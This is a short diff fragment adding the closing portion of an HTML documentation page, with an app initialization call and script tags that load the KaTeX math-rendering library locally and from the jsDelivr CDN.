+      <script>app.initialize({version:"1.0.4",url:{base:"../.."}})</script>
+      
+        <script src="../../js/katex.js"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js"></script>
+      
+    
+  </body>
+</html>
